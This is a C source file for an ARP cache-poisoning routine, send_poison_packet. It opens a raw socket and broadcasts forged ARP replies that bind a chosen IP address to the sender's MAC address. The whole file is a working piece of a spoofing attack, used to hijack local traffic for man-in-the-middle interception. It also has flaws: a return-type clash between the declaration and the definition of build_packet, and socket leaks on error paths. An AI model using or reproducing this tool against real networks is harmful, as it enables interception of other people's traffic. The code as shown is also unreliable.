#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <unistd.h>

#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>

#include "poison.h"

#define ARP_PACKET_SIZE 42

static size_t build_packet(struct in_addr *,
                           struct ether_addr *,
                           unsigned char *packet);

int send_poison_packet(const struct in_addr *ip,
                       const struct ether_addr *mac_in,
                       const char *ifname_in)
{
    const char *ifname = ifname_in == NULL ? "eth0" : ifname_in;
    struct ether_addr mac;
    int sock;
    struct sockaddr_ll dst_sockaddr;
    unsigned char packet[ARP_PACKET_SIZE];
    size_t packet_sz, i;

    sock = socket(PF_PACKET, SOCK_RAW, 0);
    if (sock < 0)
        return -1;

    if (mac_in == NULL) {
        // Get the MAC address from the interface name
        struct ifreq ifr;
        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
            return -1;
        memcpy(mac.ether_addr_octet, ifr.ifr_hwaddr.sa_data, 6);
    } else
        mac = *mac_in;

    // Make dst_sockaddr for sendto()
    {
        struct ifreq ifr;

        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0)
            return -1;

        memset(&dst_sockaddr, 0, sizeof(dst_sockaddr));
        dst_sockaddr.sll_family = AF_PACKET;
        dst_sockaddr.sll_ifindex = ifr.ifr_ifindex;
        dst_sockaddr.sll_halen = 6;
        memset(dst_sockaddr.sll_addr, '\xff', 6);
    }

    packet_sz = build_packet(ip, &mac, packet);

    if (sendto(sock, packet, packet_sz, 0,
               (struct sockaddr *) &dst_sockaddr, sizeof(dst_sockaddr)) < 0)
        return -1;

    return 0;
}

static int build_packet(struct in_addr *ip,
                        struct ether_addr *mac,
                        unsigned char *packet)
{
    // Ethernet header
    memcpy(packet + 0, "\xff\xff\xff\xff\xff\xff", 6);  // MAC destination
    memcpy(packet + 6, mac, 6);                         // MAC source
    memcpy(packet + 12, "\x08\x06", 2);                 // EtherType (ARP)

    // Ethernet payload
    memcpy(packet + 14, "\x00\x01", 2);  // Hardware type (1 for Ethernet)
    memcpy(packet + 16, "\x08\x00", 2);  // Protocol type (0x0800 for IPv4)
    packet[18] = '\x06';                 // Hardware address length
    packet[19] = '\x04';                 // Protocol address length
    memcpy(packet + 20, "\x00\x02", 2);  // Operation (2 for reply)
    memcpy(packet + 22, mac, 6);  // Sender hardware address
    memcpy(packet + 28, ip, 4);   // Sender protocol address
    memcpy(packet + 32, mac, 6);  // Target hardware address
    memcpy(packet + 38, ip, 4);   // Target protocol address
    return 42;
}
